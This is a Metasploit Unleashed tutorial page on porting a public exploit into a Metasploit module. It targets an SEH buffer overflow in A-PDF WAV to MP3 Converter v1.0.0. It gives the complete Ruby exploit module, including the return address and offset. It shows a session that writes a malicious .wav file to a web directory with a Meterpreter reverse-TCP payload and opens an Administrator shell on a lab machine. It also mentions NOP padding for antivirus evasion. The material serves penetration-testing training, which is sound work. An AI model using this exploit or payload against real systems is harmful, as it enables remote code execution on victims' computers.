
		<!DOCTYPE html>
		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
		<head>
			<title>Porting Exploits - Metasploit Unleashed</title>
			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
			<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
		</head>

		<body>
			<div id="wrapper">
			
				<div id="header">
					<div id="header-content">
						<h1><a style="color:#F0F0F0" href="index.html">Metasploit Unleashed</a></h1>
						<div class="tagline">Mastering the Framework</div>
						<div class="clear"></div>
					</div>
				</div>
				
				<div id="page">
					<div id="right-box">
						
						<div id="controls">
									<ul>
			<li id="ca-nstab-main" class="selected"><a href="Porting_Exploits" title="View the content page [c]" accesskey="c">Page</a></li>
			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Porting_Exploits&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Porting_Exploits&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Porting_Exploits&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
		</ul>
							
							<div class="portlet" id="p-personal">
								<div class="pBody">
								<ul>
																	</ul>
								</div>
							</div>
							
							<div class="search">
									<div id="p-search" class="portlet">
		<div id="searchBody" class="pBody">
			<form action="http://www.offensive-security.com/w/index.php" id="searchform">
				<input type='hidden' name="title" value="Special:Search"/>
				<input type="search" name="search" title="Search Metasploit Unleashed [f]" accesskey="f" id="searchInput" />
				<input type="submit" name="go" value="Go" title="Go to a page with this exact name if exists" id="searchGoButton" class="searchButton" />&#160;
				<input type="submit" name="fulltext" value="Search" title="Search the pages for this text" id="mw-searchButton" class="searchButton" />
			</form>
		</div>
	</div>
							</div>
							
							<div class="clear"></div>
						</div>
					
						<a id="top"></a>
						
						<div id="content">
							<h1>Porting Exploits</h1>
						
							<div id="siteSub">From Metasploit Unleashed</div>
							<div id="contentSub"></div>
																													<div id="jump-to-nav">Jump to: <a href="Porting_Exploits#column-one">navigation</a>, <a href="Porting_Exploits#searchInput">search</a></div>
														<!-- start content -->
							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Although Metasploit is commercially owned, it is still an open source project and grows and thrives based on user-contributed modules.  As there are only a handful of full-time developers on the team, there is a great opportunity to port existing public exploits to the Metasploit Framework.  Porting exploits will not only help make Metasploit more versatile and powerful, it is also an excellent way to learn about the inner workings of the framework and helps you improve your Ruby skills at the same time.  One very important point to remember when writing Metasploit modules is that you *always* need to use hard tabs and not spaces.  For a few other important module details, refer to the 'HACKING' file located in the root of the Metasploit directory.  There is some important information that will help ensure your submissions are quickly added to the trunk.
<br />
<br />
To begin, we'll first need to obviously select an exploit to port over.  We will use the A-PDF WAV to MP3 Converter exploit as published at <a rel="nofollow" class="external free" href="http://www.exploit-db.com/exploits/14681">http://www.exploit-db.com/exploits/14681</a>.  When porting exploits, there is no need to start coding completely from scratch; we can simply select a pre-existing exploit module and modify it to suit our purposes.  Since this is a fileformat exploit, we will look under modules/exploits/windows/fileformat/ off the main Metasploit directory for a suitable candidate.  This particular exploit is a SEH overwrite so we need to find a module that uses the Msf::Exploit::Remote::Seh mixin.  We can find this near the top of the exploit audiotran_pls.rb as shown below.
<br />
<br />
<pre>require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
        Rank = GoodRanking

        include Msf::Exploit::FILEFORMAT
        include Msf::Exploit::Remote::Seh</pre>
<br />
Having found a suitable template to use for our module, we then strip out everything specific to the existing module and save it under ~/.msf3/modules/exploits/windows/fileformat/ . You may need to create the additional directories under your home directory if you are following along exactly.  Note that it is possible to save the custom module under the main Metasploit directory but it can cause issues when updating the framework if you end up submitting a module to be included in the trunk.  Our stripped down exploit looks like this:
<br />
<br />
<pre>##
# $Id: $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking

    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh

    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Exploit Title',
            'Description'    => %q{
                    Exploit Description
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'Author'
                ],
            'Version'        => '$Revision: $',
            'References'     =>
                [
                    [ 'URL', 'http://www.somesite.com ],
                ],
            'Payload'        =>
                {
                    'Space'    => 6000,
                    'BadChars' => "\x00\x0a",
                    'StackAdjustment' => -3500,
                },
            'Platform' => 'win',
            'Targets'        =>
                [
                    [ 'Windows Universal', { 'Ret' =>  } ],
                ],
            'Privileged'     => false,
            'DisclosureDate' => 'Date',
            'DefaultTarget'  => 0))

            register_options(
                [
                    OptString.new('FILENAME', [ true, 'The file name.',  'filename.ext']),
                ], self.class)

    end

    def exploit
      
        print_status("Creating '#{datastore['FILENAME']}' file ...")

        file_create(sploit)

    end

end</pre>
<br />
Now that our skeleton is ready, we can start plugging in the information from the public exploit, assuming that it has been tested and verified that it works.  We start by adding the title, description, author(s), and references.  Note that it is common courtesy to name the original public exploit authors as it was their hard work that found the bug in the first place.
<br />
<br />
<pre>    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'A-PDF WAV to MP3 v1.0.0 Buffer Overflow',
            'Description'    => %q{
                    This module exploits a buffer overflow in A-PDF WAV to MP3 v1.0.0. When
                the application is used to import a specially crafted m3u file, a buffer overflow occurs
                allowing arbitrary code execution.
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'd4rk-h4ck3r',         # Original Exploit
                    'Dr_IDE',        # SEH Exploit
                    'dookie'        # MSF Module
                ],
            'Version'        => '$Revision: $',
            'References'     =>
                [
                    [ 'URL', 'http://www.exploit-db.com/exploits/14676/' ],
                    [ 'URL', 'http://www.exploit-db.com/exploits/14681/' ],
                ],</pre>
<br />
Everything is self-explanatory to this point and other than the Metasploit module structure, there is nothing complicated going on so far.  Carrying on farther in the module, we'll ensure the EXITFUNC is set to 'seh' and set 'DisablePayloadHandler' to 'true' to eliminate any conflicts with the payload handler waiting for the shell. While studying the public exploit in a debugger, we have determined that there are approximately 600 bytes of space available for shellcode and that \x00 and \x0a are bad characters that will corrupt our shellcode.  Finding bad characters is always tedious but to ensure exploit reliability, it is a necessary evil.  For more information of finding bad characters, see this link: <a rel="nofollow" class="external free" href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Dealing_with_badchars">http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Dealing_with_badchars</a>.  In the 'Targets' section, we add the all-important pop/pop/retn return address for the exploit, the length of the buffer required to reach the SE Handler, and a comment stating where the address comes from.  Since this return address is from the application binary, the target is 'Windows Universal' in this case.  Lastly, we add the date the exploit was disclosed and ensure the 'DefaultTarget' value is set to 0.
<br />
<br />
<pre>            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'seh',
                    'DisablePayloadHandler' => 'true'
                },
            'Payload'        =>
                {
                    'Space'    => 600,
                    'BadChars' => "\x00\x0a",
                    'StackAdjustment' => -3500
                },
            'Platform' => 'win',
            'Targets'        =>
                [
                    [ 'Windows Universal', { 'Ret' => 0x0047265c, 'Offset' => 4132 } ],    # p/p/r in wavtomp3.exe
                ],
            'Privileged'     => false,
            'DisclosureDate' => 'Aug 17 2010',
            'DefaultTarget'  => 0))</pre>
<br />
The last part we need to edit before moving on to the actual exploit is the 'register_options' section.  In this case, we need to tell Metasploit what the default filename will be for the exploit.  In network-based exploits, this is where we would declare things like the default port to use.
<br />
<br />
<pre>        register_options(
            [
                OptString.new('FILENAME', [ false, 'The file name.', 'msf.wav']),
            ], self.class)</pre>
<br />
The final, and most interesting, section to edit is the 'exploit' block where all of the pieces come together.  First, rand_text_alpha_upper(target['Offset']) will create our buffer leading up to the SE Handler using random, upper-case alphabetic characters using the length we specified in the 'Targets' block of the module.  Next, generate_seh_record(target.ret) adds the short jump and return address that we normally see in public exploits.  The next part, make_nops(12), is pretty self-explanatory; Metasploit will use a variety of No-Op instructions to aid in IDS/IPS/AV evasion.  Lastly, payload.encoded adds on the dynamically generated shellcode to the exploit.  A message is printed to the screen and our malicious file is written to disk so we can send it to our target.
<br />
<br />
<pre>    def exploit

        sploit = rand_text_alpha_upper(target['Offset'])
        sploit << generate_seh_record(target.ret)
        sploit << make_nops(12)
        sploit << payload.encoded
           
        print_status("Creating '#{datastore['FILENAME']}' file ...")

        file_create(sploit)
       
    end</pre>
<br />
Now that we have everything edited, we can take our newly created module for a test drive.
<br />
<br />
<pre>msf > <span style='color:#13C16A;'>search a-pdf</span>
<span style='color:#0000FF;'>[*]</span> Searching loaded modules for pattern 'a-pdf'...

Exploits
========

   Name                                              Rank    Description
   ----                                              ----    -----------
   windows/browser/adobe_flashplayer_newfunction     normal  Adobe Flash Player "newfunction" Invalid Pointer Use
   windows/fileformat/a-pdf_wav_to_mp3               normal  A-PDF WAV to MP3 v1.0.0 Buffer Overflow
   windows/fileformat/adobe_flashplayer_newfunction  normal  Adobe Flash Player "newfunction" Invalid Pointer Use

msf > <span style='color:#13C16A;'>use exploit/windows/fileformat/a-pdf_wav_to_mp3</span>
msf exploit(<span style='color:#ff0000;'>a-pdf_wav_to_mp3</span>) > <span style='color:#13C16A;'>show options</span>

Module options:

   Name        Current Setting                      Required  Description
   ----        ---------------                      --------  -----------
   FILENAME    msf.wav                              no        The file name.
   OUTPUTPATH  /opt/metasploit3/msf3/data/exploits  yes       The location of the file.


Exploit target:

   Id  Name
   --  ----
   0   Windows Universal


msf exploit(<span style='color:#ff0000;'>a-pdf_wav_to_mp3</span>) > <span style='color:#13C16A;'>set OUTPUTPATH /var/www</span>
OUTPUTPATH => /var/www
msf exploit(<span style='color:#ff0000;'>a-pdf_wav_to_mp3</span>) > <span style='color:#13C16A;'>set PAYLOAD windows/meterpreter/reverse_tcp</span>
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(<span style='color:#ff0000;'>a-pdf_wav_to_mp3</span>) > <span style='color:#13C16A;'>set LHOST 192.168.1.101</span>
LHOST => 192.168.1.101
msf exploit(<span style='color:#ff0000;'>a-pdf_wav_to_mp3</span>) > <span style='color:#13C16A;'>exploit</span>

<span style='color:#0000FF;'>[*]</span> Started reverse handler on 192.168.1.101:4444
<span style='color:#0000FF;'>[*]</span> Creating 'msf.wav' file ...
<span style='color:#0000FF;'>[*]</span> Generated output file /var/www/msf.wav
<span style='color:#0000FF;'>[*]</span> Exploit completed, but no session was created.
msf exploit(<span style='color:#ff0000;'>a-pdf_wav_to_mp3</span>) ></pre>
<br />
Everything seems to be working fine so far.  Now we just need to setup a meterpreter listenter and have our victim open up our malicious file in the vulnerable application.
<br />
<br />
<pre>msf exploit(<span style='color:#ff0000;'>a-pdf_wav_to_mp3</span>) > <span style='color:#13C16A;'>use exploit/multi/handler</span>
msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>set PAYLOAD windows/meterpreter/reverse_tcp</span>
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>set LHOST 192.168.1.101</span>
LHOST => 192.168.1.101
msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>exploit</span>

<span style='color:#0000FF;'>[*]</span> Started reverse handler on 192.168.1.101:4444
<span style='color:#0000FF;'>[*]</span> Starting the payload handler...
<span style='color:#0000FF;'>[*]</span> Sending stage (748544 bytes) to 192.168.1.160
<span style='color:#0000FF;'>[*]</span> Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.160:53983) at 2010-08-31 20:59:04 -0600

<u>meterpreter</u> > <span style='color:#13C16A;'>sysinfo</span>
Computer: XEN-XP-PATCHED
OS      : Windows XP (Build 2600, Service Pack 3).
Arch    : x86
Language: en_US
<u>meterpreter</u>> <span style='color:#13C16A;'>getuid</span>
Server username: XEN-XP-PATCHED\Administrator
<u>meterpreter</u>></pre>
<br />
Success!  Not all exploits are this easy to port over but the time spent is well worth it and helps to make an already excellent tool even better.
For further information on porting exploits and contributing to Metasploit in general, see the following links:
<br />
<a rel="nofollow" class="external free" href="http://www.metasploit.com/redmine/projects/framework/repository/entry/HACKING">http://www.metasploit.com/redmine/projects/framework/repository/entry/HACKING</a>
<br />
<a rel="nofollow" class="external free" href="http://www.metasploit.com/redmine/projects/framework/wiki/PortingExploits">http://www.metasploit.com/redmine/projects/framework/wiki/PortingExploits</a>
<br />
<a rel="nofollow" class="external free" href="http://www.metasploit.com/redmine/projects/framework/wiki/ExploitModuleDev">http://www.metasploit.com/redmine/projects/framework/wiki/ExploitModuleDev</a>
<br />
</p>
<hr />
<p><br />
















</p>
<div class="Total1"><a href="Exploit_Development" title="Exploit Development">Exploit Development</a> &gt; Porting Exploits</div>
<p>











































</p>
<div class="Total2"><a href="Exploit_Design_Goals" title="Exploit Design Goals">Exploit Design Goals</a> &#124; <a href="Exploit_Format" title="Exploit Format">Exploit Format</a> &#124; <a href="Exploit_Mixins" title="Exploit Mixins">Exploit Mixins</a> &#124; <a href="Exploit_Targets" title="Exploit Targets">Exploit Targets</a> &#124; <a href="Exploit_Payloads" title="Exploit Payloads">Exploit Payloads</a> &#124; <a href="Writing_An_Exploit" title="Writing An Exploit">Writing An Exploit</a> &#124; <a href="Using_The_Egghunter_Mixin" title="Using The Egghunter Mixin">Using The Egghunter Mixin</a> &#124; <strong class="selflink">Porting Exploits</strong></div>
<p>




































































</p>
<!-- 
NewPP limit report
Preprocessor visited node count: 539/1000000
Preprocessor generated node count: 2785/1000000
Post‐expand include size: 4000/2097152 bytes
Template argument size: 0/2097152 bytes
Highest expansion depth: 3/40
Expensive parser function count: 0/100
-->

<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:49-0!*!0!*!*!*!* and timestamp 20131124052233 -->
</div><div class="printfooter">
Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Porting_Exploits&amp;oldid=59">http://www.offensive-security.com/w/index.php?title=Porting_Exploits&amp;oldid=59</a>"</div>
							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Exploit_Development&amp;action=edit&amp;redlink=1" class="new" title="Category:Exploit Development (page does not exist)">Exploit Development</a></li></ul></div></div>							<!-- end content -->
													</div>
						
					</div>
				
					<div id="left-box">
								<ul id="nav">
				<li><a href="Donate" class="root">Donate</a></li>
				<li>
					<a href="Introduction" class="root"><span class="chapter">01</span> Introduction</a>
					<div class="menu two-column">
						<h3>Introduction</h3>
						<ul class="one">
							<li><a href="Metasploit_Architecture">Metasploit Architecture</a>
								<ul class="two small">
									<li><a href="Filesystem_And_Libraries">Filesystem And Libraries</a></li>
									<li><a href="Modules_And_Locations">Modules And Locations</a></li>
									<li><a href="Metasploit_Object_Model">Metasploit Object Model</a></li>
									<li><a href="Mixins_And_Plugins">Mixins And Plugins</a></li>
								</ul>
							</li>
						</ul>
						<div class="clear"></div>
					</div>
				</li>
				<li>
					<a href="Requirements" class="root"><span class="chapter">02</span> Requirements</a>
					<div class="menu two-column">
						<h3>Required Materials</h3>
						<ul class="one">
							<li><a href="Metasploitable">Metasploitable</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Metasploit_Fundamentals" class="root"><span class="chapter">03</span>Metasploit Fundamentals</a>
					<div class="menu four-column">
						<h3>Metasploit Fundamentals</h3>
						<ul class="one">
							<li><a href="Msfcli">Msfcli</a></li>
							<li><a href="Msfconsole">Msfconsole</a>
								<ul class="two small">
									<li><a href="Msfconsole_Commands">Msfconsole Commands</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Exploits">Exploits</a>
								<ul class="two">
									<li><a href="Using_Exploits">Using Exploits</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Payloads">Payloads</a>
								<ul class="two small">
									<li><a href="Payload_Types">Payload Types</a></li>
									<li><a href="Generating_Payloads">Generating Payloads</a></li>
								</ul>
								<div class="clear"></div>
							</li>
                                                        <li><a href="Databases">Databases</a>
                                                                <ul class="two small">
                                                                        <li><a href="Using_the_Database">Using the Database</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
                                                        </li>
							<li><a href="About_Meterpreter">About Meterpreter</a>
								<ul class="two">
									<li><a href="Meterpreter_Basics">Meterpreter Basics</a></li>
								</ul>
								<div class="clear"></div>
							</li>
						</ul>
						<div class="clear"></div>
					</div>
				</li>
				<li>
				<a href="Information_Gathering" class="root"><span class="chapter">04</span> Information Gathering</a>
					<div class="menu two-column">
						<h3>Information Gathering</h3>
						<ul class="one">
							<li><a href="Port_Scanning">Port Scanning</a></li>
							<li><a href="Hunting_For_MSSQL">Hunting For MSSQL</a></li>
							<li><a href="Service_Identification">Service Identification</a></li>
							<li><a href="Password_Sniffing">Password Sniffing</a>
								<ul class="two">
									<li><a href="Extending_Psnuffle">Extending Psnuffle</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="SNMP_Sweeping">SNMP Sweeping</a></li>
							<li><a href="Writing_Your_Own_Scanner">Writing Your Own Scanner</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Vulnerability_Scanning" class="root"><span class="chapter">05</span> Vulnerability Scanning</a>
					<div class="menu two-column">
						<h3>Vulnerability Scanning</h3>
						<ul class="one">
							<li><a href="SMB_Login_Check">SMB Login Check</a></li>
							<li><a href="VNC_Authentication">VNC Authentication</a></li>
							<li><a href="WMAP_Web_Scanner">WMAP Web Scanner</a></li>
							<li><a href="Working_With_NeXpose">Working With NeXpose</a>
		     		                                <ul class="two small">
                                                                        <li><a href="NeXpose_Via_Msfconsole">NeXpose Via Msfconsole</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
							</li>
                                                        <li><a href="Working_With_Nessus">Working With Nessus</a>
								<ul class="two small">
									<li><a href="Nessus_Via_Msfconsole">Nessus Via Msfconsole</a></li>
								</ul>
								<div class="clear"></div>
							</li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Writing_A_Simple_Fuzzer" class="root"><span class="chapter">06</span> Writing A Simple Fuzzer</a>
					<div class="menu two-column">
						<h3>Writing a Simple Fuzzer</h3>
						<ul class="one">
							<li><a href="Simple_TFTP_Fuzzer">Simple TFTP Fuzzer</a></li>
							<li><a href="Simple_IMAP_Fuzzer">Simple IMAP Fuzzer</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Exploit_Development" class="root"><span class="chapter">07</span> Exploit Development</a>
					<div class="menu two-column">
						<h3>Exploit Development</h3>
						<ul class="one">
							<li><a href="Exploit_Design_Goals">Exploit Design Goals</a></li>
							<li><a href="Exploit_Format">Exploit Format</a></li>
							<li><a href="Exploit_Mixins">Exploit Mixins</a></li>
							<li><a href="Exploit_Targets">Exploit Targets</a></li>
							<li><a href="Exploit_Payloads">Exploit Payloads</a>
								<ul class="two small">
									<li><a href="Msfvenom">Msfvenom</a></li>
									<li><a href="Msfpayload">Msfpayload</a></li>
									<li><a href="Msfencode">Msfencode</a></li>
									<li><a href="Alphanumeric_Shellcode">Alphanumeric Shellcode</a></li>
									<li><a href="Msfrop">Msfrop</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Writing_An_Exploit">Writing An Exploit</a>
								<ul class="two small">
									<li><a href="Getting_A_Shell">Getting A Shell</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Using_The_Egghunter_Mixin">Using The Egghunter Mixin</a>
								<ul class="two small">
									<li><a href="Completing_The_Exploit">Completing The Exploit</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Porting_Exploits">Porting Exploits</a></li>
						</ul>
					</div>
				</li>
                                <li>
                                        <a href="Web_App_Exploit_Dev" class="root"><span class="chapter">08</span> Web App Exploit Dev</a>
                                        <div class="menu two-column">
                                                <h3>Client-side Exploits</h3>
                                                <ul class="one">
                                                        <li><a href="Installing_dotDefender">Installing dotDefender</a></li>
                                                        <li><a href="Analyzing_the_Exploit">Analyzing the Exploit</a></li>
                                                        <li><a href="Skeleton_Creation">Skeleton Creation</a></li>
                                                        <li><a href="Making_A_Log_Entry">Making A Log Entry</a></li>
                                                        <li><a href="Hosting_the_Javascript">Hosting the Javascript</a></li>
                                                        <li><a href="Final_Exploit">Final Exploit</a></li>
                                                </ul>
                                        </div>
                                </li>
				<li>
					<a href="Client_Side_Attacks" class="root"><span class="chapter">09</span> Client Side Attacks</a>
					<div class="menu three-column">
						<h3>Client Side Attacks</h3>
						<ul class="one">
							<li><a href="Binary_Payloads">Binary Payloads</a></li>
							<ul class="two small">
								<li><a href="Binary_Linux_Trojan">Binary Linux Trojan</a></li>
							</ul>
							<div class="clear"></div>
							<li><a href="Client_Side_Exploits">Client Side Exploits</a></li>
							<li><a href="VBScript_Infection_Methods">VBScript Infection Methods</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="MSF_Post_Exploitation" class="root"><span class="chapter">10</span> MSF Post Exploitation</a>
					<div class="menu two-column">
						<h3>MSF Post Exploitation</h3>
						<ul class="one">
							<li><a href="Privilege_Escalation">Privilege Escalation</a></li>
							<li><a href="PSExec_Pass_The_Hash">PSExec Pass the Hash</a></li>
							<li><a href="Event_Log_Management">Event Log Management</a></li>
							<li><a href="Fun_With_Incognito">Fun with Incognito</a></li>
							<li><a href="Interacting_With_The_Registry">Interacting with the Registry</a>
								<ul class="two small">
									<li><a href="Persistent_Netcat_Backdoor">Persistent Netcat Backdoor</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Enabling_Remote_Desktop">Enabling Remote Desktop</a></li>
							<li><a href="Packet_Sniffing">Packet Sniffing</a></li>
							<li><a href="Pivoting">Pivoting</a></li>
                                                                <ul class="two small">
                                                                        <li><a href="Portfwd">Portfwd</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
							<li><a href="TimeStomp">TimeStomp</a></li>
							<li><a href="Screen_Capture">Screen Capture</a></li>
							<li><a href="Searching_For_Content">Searching For Content</a></li>
							<li><a href="John_The_Ripper">John The Ripper</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Meterpreter_Scripting" class="root"><span class="chapter">11</span> Meterpreter Scripting</a>
					<div class="menu two-column">
						<h3>Meterpreter Scripting</h3>
						<ul class="one">
							<li><a href="Existing_Scripts">Existing Scripts</a></li>
							<li><a href="Writing_Meterpreter_Scripts">Writing Meterpreter Scripts</a></li>
							<li><a href="Custom_Scripting">Custom Scripting</a></li>
							<li><a href="Useful_API_Calls">Useful API Calls</a></li>
							<li><a href="Useful_Functions">Useful Functions</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Maintaining_Access" class="root"><span class="chapter">12</span> Maintaining Access</a>
					<div class="menu two-column">
						<h3>Maintaining Access</h3>
						<ul class="one">
							<li><a href="Keylogging">Keylogging</a></li>
							<li><a href="Meterpreter_Backdoor">Meterpreter Backdoor</a></li>
							<li><a href="Persistent_Backdoors">Persistent Backdoors</a></li>
						        <ul class="two small">
								 <li><a href="Netcat_Backdoor">Netcat Backdoor</a></li>
		 						 <li><a href="Meterpreter_Service">Meterpreter Service</a></li>
							</ul>
								 <div class="clear"></div>
						</ul>
					</div>
				</li>
				<li>
					<a href="MSF_Extended_Usage" class="root"><span class="chapter">13</span> MSF Extended Usage</a>
					<div class="menu two-column">
						<h3>MSF Extended Usage</h3>
						<ul class="one">
							<li><a href="PHP_Meterpreter">PHP Meterpreter</a></li>
							<li><a href="Backdooring_EXE_Files">Backdooring EXE Files</a></li>
							<li><a href="Karmetasploit">Karmetasploit</a>
								<ul class="two small">
									<li><a href="Karmetasploit_Configuration">Configuration</a></li>
									<li><a href="Karmetasploit_In_Action">Karmetasploit in Action</a></li>
									<li><a href="Attack_Analysis">Attack Analysis</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="MSF_vs_OS_X">MSF vs OS X</a></li>
							<li><a href="File-Upload_Backdoors">File-Upload Backdoors</a></li>
							<li><a href="Building_A_Module">Building A Module</a>
								<ul class="two small">
									<li><a href="Payloads_Through_MSSQL">Payloads Through MSSQL</a></li>
									<li><a href="Creating_Our_Auxiliary_Module">Creating Our Auxiliary Module</a></li>
									<li><a href="The_Guts_Behind_It">The Guts Behind It</a></li>
								</ul>
								<div class="clear"></div>
							</li>
						</ul>
					</div>
				</li>
				<li>
                                        <a href="Metasploit_GUIs" class="root"><span class="chapter">14</span> Metasploit GUIs</a>
					<div class="menu two-column">
						<h3>Metasploit GUIs</h3>
						<ul class="one">
							<li><a href="MSF_Community_Edition">MSF Community Edition</a>
								<ul class="two small">
                                                                        <li><a href="Scanning">Scanning</a></li>
                                                                        <li><a href="Exploitation">Exploitation</a></li>
                                                                        <li><a href="Post_Exploitation">Post Exploitation</a></li>
                                                                </ul>
								<div class="clear"></div>
                                                        </li>
							<li><a href="Armitage">Armitage</a>
                                                                <ul class="two small">
                                                                        <li><a href="Armitage_Setup">Armitage Setup</a></li>
                                                                        <li><a href="Armitage_Scanning">Armitage Scanning</a></li>
                                                                        <li><a href="Armitage_Exploitation">Armitage Exploitation</a></li>
                                                                	<li><a href="Armitage_Post_Exploitation">Armitage Post Exploitation</a></li>
								</ul>
							</li>
						</ul>
					</div>
				</li>
				<li><a href="About_The_Authors" class="root">About The Authors</a>
					<div class="menu two-column">
						<h3>About the Authors</h3>
						<ul class="one">
							<li><a href="Mati_Aharoni">Mati Aharoni</a></li>
							<li><a href="William_Coppola">William Coppola</a></li>
							<li><a href="Paul_Hand">Paul Hand</a></li>
							<li><a href="Alain_Hernandez">Alain Hernandez</a></li>
							<li><a href="Devon_Kearns">Devon Kearns</a></li>
							<li><a href="David_Kennedy">David Kennedy</a></li>
							<li><a href="Steven_McElrea">Steven McElrea</a></li>
							<li><a href="Matteo_Memelli">Matteo Memelli</a></li>
							<li><a href="http://www.offensive-security.com/metasploit-unleashed/Jim_O'Gorman">Jim O'Gorman</a></li>
							<li><a href="David_Ovitz">David Ovitz</a></li>
							<li><a href="Carlos_Perez">Carlos Perez</a></li>
						</ul>
					</div>
				</li>
                                <li><a href="Post_Module_Reference" class="root">Post Module Reference</a>    
                                        <div class="menu three-column">
                                                <h3>Post Module Reference</h3>
                                                <ul class="one">
                                                        <li>Windows   
                                                                <ul class="two">
                                                                        <li><a href="Windows_Post_Capture_Modules">Capture</a></li>
                                                                        <li><a href="Windows_Post_Gather_Modules">Gather</a></li>
                                                                        <li><a href="Windows_Post_Manage_Modules">Manage</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
                                                        </li>
                                                        <li>Linux
                                                                <ul class="two">
                                                                        <li><a href="Linux_Post_Gather_Modules">Gather</a></li>
                                                                </ul>
								                                <div class="clear"></div>
                                                        </li>
                                                        <li>OS X
                                                                <ul class="two">
                                                                        <li><a href="OS_X_Post_Gather_Modules">Gather</a></li>
                                                                </ul>
					                                			<div class="clear"></div>
                                                        </li>
                                                        <li>Multiple OS
                                                                <ul class="two">
                                                                        <li><a href="Multiple_OS_Post_Gather_Modules">Gather</a></li>
                                                                        <li><a href="Multiple_OS_Post_General_Modules">General</a></li>
                                                                </ul>
							                                	<div class="clear"></div>
                                                        </li>
                                                </ul>
                                        </div>
                                </li>
                                <li><a href="Auxiliary_Module_Reference" class="root">Auxiliary Module Reference</a>    
                                        <div class="menu four-column">
                                                <h3>Auxiliary Module Reference</h3>
                                                <ul class="one">
                                                        <li>Admin   
                                                                <ul class="two">
                                                                        <li><a href="Admin_HTTP_Auxiliary_Modules">HTTP</a></li>
                                                                        <li><a href="Admin_MSSQL_Auxiliary_Modules">MSSQL</a></li>
                                                                        <li><a href="Admin_MySQL_Auxiliary_Modules">MySQL</a></li>
                                                                        <li><a href="Admin_Postgres_Auxiliary_Modules">Postgres</a></li>
                                                                        <li><a href="Admin_VMWare_Auxiliary_Modules">VMWare</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
                                                        </li>
                                                        <li>Scanner
                                                                <ul class="two">
                                                                        <li><a href="Scanner_DCERPC_Auxiliary_Modules">DCERPC</a></li>
                                                                        <li><a href="Scanner_Discovery_Auxiliary_Modules">Discovery</a></li>
                                                                        <li><a href="Scanner_FTP_Auxiliary_Modules">FTP</a></li>
                                                                        <li><a href="Scanner_HTTP_Auxiliary_Modules">HTTP</a></li>
                                                                        <li><a href="Scanner_IMAP_Auxiliary_Modules">IMAP</a></li>
                                                                        <li><a href="Scanner_MSSQL_Auxiliary_Modules">MSSQL</a></li>
                                                                        <li><a href="Scanner_MySQL_Auxiliary_Modules">MySQL</a></li>
                                                                        <li><a href="Scanner_NetBIOS_Auxiliary_Modules">NetBIOS</a></li>
                                                                        <li><a href="Scanner_POP3_Auxiliary_Modules">POP3</a></li>
                                                                        <li><a href="Scanner_SMB_Auxiliary_Modules">SMB</a></li>
                                                                        <li><a href="Scanner_SMTP_Auxiliary_Modules">SMTP</a></li>
                                                                        <li><a href="Scanner_SNMP_Auxiliary_Modules">SNMP</a></li>
                                                                        <li><a href="Scanner_SSH_Auxiliary_Modules">SSH</a></li>
                                                                        <li><a href="Scanner_Telnet_Auxiliary_Modules">Telnet</a></li>
                                                                        <li><a href="Scanner_TFTP_Auxiliary_Modules">TFTP</a></li>
